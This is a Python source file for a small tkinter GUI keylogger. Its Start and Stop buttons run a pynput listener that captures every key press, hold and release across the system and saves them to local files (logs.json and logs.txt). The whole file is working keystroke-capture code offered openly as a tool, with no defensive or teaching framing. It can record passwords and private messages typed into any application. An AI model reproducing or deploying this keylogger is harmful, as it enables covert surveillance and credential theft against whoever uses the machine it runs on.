import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("250x200")
root.title("Keylogger Page")

key_list = []
x = False
key_strokes=""


def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


def on_press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
        )
    update_json_file(key_list)    


def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
    )
    if x== True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))
    

def start_keylogger():
    global keylogger_listener
    # Start the keylogger
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json' and 'logs.txt'\n")
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    # Stop the keylogger
    print("[-] Successfully Stopped Keylogger!\n")
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None



empty = Label(root, text="Keylogger", font='Verdana 11 bold').grid(row=2,column=2)
Button(root, text="Start Keylogger", command=start_keylogger).grid(row=7,column=2)
Button(root, text="Stop Keylogger", command=stop_keylogger).grid(row=9,column=2)
root.mainloop()
